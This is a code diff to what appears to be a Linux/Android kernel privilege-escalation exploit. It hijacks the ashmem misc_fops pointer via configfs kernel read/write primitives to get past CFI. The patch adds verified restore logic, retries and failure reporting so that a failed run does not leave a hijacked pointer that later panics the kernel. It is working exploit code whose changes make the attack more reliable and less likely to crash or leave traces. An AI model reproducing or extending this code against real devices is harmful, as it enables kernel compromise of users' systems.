@@ -547,6 +547,54 @@ static int fake_fops_owner_is_zero(int fd) {
   return 1;
 }
 
+/*
+ * Restore misc_fops and prove the write landed.
+ *
+ * Leaving misc_fops pointing at the payload page is not a recoverable state.
+ * The payload page is reclaimed after the stage finishes, so its contents are
+ * replaced by unrelated data -- observed in practice as kernel log text.  The
+ * next process that opens any misc device runs misc_open() ->
+ * try_module_get(fops->owner) and dereferences that garbage pointer, which
+ * panics the kernel in an unrelated process minutes later with no trace back
+ * to this run (seen as "pc : try_module_get+0x30/0x1f0" from misc_open).
+ *
+ * The old failure path wrote the original value once and ignored the result,
+ * so a single failed write left the hijack in place.  This retries across both
+ * address forms the stage knows about and only reports success when a read-back
+ * confirms the slot holds the original value again.
+ */
+static int restore_misc_fops_verified(int fd, uintptr_t misc_fops,
+                                      uint64_t original_fops) {
+  uint64_t candidates[2];
+  size_t candidate_count = 0;
+  candidates[candidate_count++] = original_fops;
+  {
+    uint64_t alias = data_addr(ASHMEM_FOPS);
+    if (alias != original_fops) {
+      candidates[candidate_count++] = alias;
+    }
+  }
+
+  for (int round = 0; round < 4; round++) {
+    for (size_t index = 0; index < candidate_count; index++) {
+      uint64_t readback = 0;
+      ssize_t wr = configfs_write_once(
+          fd, misc_fops, &candidates[index], sizeof(candidates[index]));
+      if (wr != (ssize_t)sizeof(candidates[index])) {
+        continue;
+      }
+      if (configfs_read_once(fd, misc_fops, &readback, sizeof(readback)) ==
+              (ssize_t)sizeof(readback) &&
+          readback == candidates[index]) {
+        fops_after = readback;
+        cfi_restore_ret = wr;
+        return 1;
+      }
+    }
+  }
+  return 0;
+}
+
 
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
@@ -636,8 +684,18 @@ int try_cfi_stage(void) {
   }
 
   /* Gate: probe configfs path before attempting any read/write we can't
-   * recover from.  If configfs is broken (ENOTTY), bail out early — the
-   * restore write would also fail, leaving misc_fops hijacked → panic. */
+   * recover from.  The rt_mutex write already ran in the caller
+   * (slide_trigger_physical_state) before this stage was entered, so bailing
+   * here does not undo it: if that write landed on misc_fops, misc_fops is
+   * hijacked right now and every later open of a misc device runs
+   * misc_open -> try_module_get(fops->owner) on the payload page.  The payload
+   * page is reclaimed afterwards, so the dereference hits unrelated data and
+   * panics the kernel in a random process minutes later.
+   *
+   * Bailing out silently is therefore the worst option.  Try the restore
+   * anyway -- a broken read does not always imply a broken write -- and if it
+   * still cannot be proven, say so explicitly so the run is not mistaken for a
+   * harmless clean miss. */
   {
     uint64_t probe = 0;
     uintptr_t probe_target = data_addr(ASHMEM_MISC_FOPS);
@@ -647,6 +705,17 @@ int try_cfi_stage(void) {
                  probe_rb, errno, probe_target);
       cfi_last_step = 14;
       cfi_last_errno = errno;
+      if (kaslr_done) {
+        uint64_t original_early = canon_addr(ASHMEM_FOPS);
+        if (restore_misc_fops_verified(fd, probe_target, original_early)) {
+          pr_warning("cfi misc_fops restored after failed gate probe\n");
+        } else {
+          pr_error("cfi FATAL misc_fops may be hijacked after failed gate "
+                   "probe; kernel state is unsafe until reboot "
+                   "(target=%016zx want=%016llx)\n",
+                   probe_target, (unsigned long long)original_early);
+        }
+      }
       SYSCHK(close(fd));
       return 0;
     }
@@ -664,6 +733,30 @@ int try_cfi_stage(void) {
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
+    /*
+     * dirty is still 0 here, so the fail path below would skip the restore.
+     * That is wrong: the rt_mutex write in the caller already ran, so
+     * misc_fops may be hijacked even though it does not read back as fake_fops
+     * (the write may have landed elsewhere, or on this slot with a torn value).
+     * A hijacked misc_fops panics the kernel later via
+     * misc_open -> try_module_get(fops->owner), so attempt a verified restore
+     * before unwinding.  Skip it only when the slot already holds the real
+     * ashmem_fops, which is the healthy value.
+     */
+    if (kaslr_done) {
+      uint64_t original_mismatch = canon_addr(ASHMEM_FOPS);
+      if (pre_fops != original_mismatch) {
+        if (restore_misc_fops_verified(fd, misc_fops, original_mismatch)) {
+          pr_warning("cfi misc_fops restored after mismatch\n");
+        } else {
+          pr_error("cfi FATAL misc_fops not fake_fops and restore failed; "
+                   "kernel state is unsafe until reboot "
+                   "(target=%016zx want=%016llx now=%016llx)\n",
+                   misc_fops, (unsigned long long)original_mismatch,
+                   (unsigned long long)fops_after);
+        }
+      }
+    }
     goto fail;
   }
 
@@ -837,9 +930,19 @@ int try_cfi_stage(void) {
   }
 
   int owner_ok = fake_fops_owner_is_zero(fd);
+  /*
+   * owner_ok was computed but the return value below only checked `restore`,
+   * so a payload page whose fops->owner was not zero still counted as success.
+   * misc_open() runs try_module_get(fops->owner) on every open of a misc
+   * device, so a non-zero owner is a live panic trigger, not a warning.
+   */
+  if (!owner_ok) {
+    cfi_last_step = 7;
+    cfi_last_errno = errno;
+    goto fail;
+  }
   SYSCHK(close(fd));
-  if (owner_ok &&
-      restore == (ssize_t)sizeof(original_fops)) {
+  if (restore == (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 0;
     cfi_last_errno = 0;
     atomic_store(&cfi_stage_done, 1);
@@ -855,17 +958,22 @@ fail:
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
-    cfi_restore_ret = configfs_write_once(
-        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
-    if (can_read_back &&
-        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
-      uint64_t after_fail = 0;
-      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
-          (ssize_t)sizeof(after_fail)) {
-        fops_after = after_fail;
-      }
-    }
+    /*
+     * Verify the restore instead of firing one blind write.  If misc_fops is
+     * left hijacked the kernel panics later, in a random process, with no link
+     * back to this run -- so a failed restore is strictly worse than a failed
+     * exploit attempt.  Report it loudly when even the retry cannot restore.
+     */
+    int restored = restore_misc_fops_verified(
+        fd, misc_fops, original_fops_fail);
     fake_fops_owner_is_zero(fd);
+    if (!restored) {
+      pr_error("cfi FATAL misc_fops restore failed; kernel state is unsafe "
+               "until reboot (target=%016zx want=%016llx now=%016llx)\n",
+               misc_fops, (unsigned long long)original_fops_fail,
+               (unsigned long long)fops_after);
+      cfi_restore_ret = -1;
+    }
   }
   SYSCHK(close(fd));
   return 0;
